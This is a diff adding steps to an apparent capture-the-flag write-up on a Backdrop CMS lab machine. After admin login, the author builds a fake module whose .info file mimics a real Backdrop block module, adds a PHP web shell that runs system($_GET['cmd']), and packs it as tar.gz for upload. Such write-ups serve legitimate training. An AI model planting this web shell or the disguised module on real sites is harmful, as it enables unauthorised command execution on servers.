@@ -119,6 +119,71 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - I was able to login to the admin dashboard.
 
+![image](https://github.com/user-attachments/assets/f8193d68-d6a8-4dcc-bc0c-26f4e478361a)
+
+- This version of Backdoor CMS is vulnerable to [authenticated Remote Code Execution](https://www.exploit-db.com/exploits/52021) as explained here.In this target's case, zip files are not allowed, only tar,gz and bz2 archives are allowed.
+
+![image](https://github.com/user-attachments/assets/e4458640-42be-467e-acef-ce7c013dfd4b)
+
+-------------
+
+### Creating an exploit
+
+-------------
+
+- I created a directory named `sensei` containing the info file and a php file containing the malicious code.
+
+![image](https://github.com/user-attachments/assets/3db5340d-5a13-4e0a-b1d5-5f1570970d29)
+
+- sensei.info content-:
+
+```info
+type = module
+name = sensei
+description = Controls the visual building blocks a page is constructedwith. Blocks are boxes of content rendered into an area, or region, of aweb page.
+package = Layouts
+tags[] = Sensei
+tags[] = Site Architecture
+version = BACKDROP_VERSION
+backdrop = 1.x
+
+configure = admin/structure/block
+
+; Added by Backdrop CMS packaging script on 2024-03-07
+project = backdrop
+version = 1.27.1
+timestamp = 1709862662
+```
+- Php shell-:
+
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>
+```
+
+- Then, create a tar.gz file with `tar -czf <example.tar.gz> <directory +or +file>`
+
+![image](https://github.com/user-attachments/assets/f455729f-5602-4f6a-8354-4ad4f35aa48e)
+
+- Upload it and install
+
+
+
+
+
 
 
 
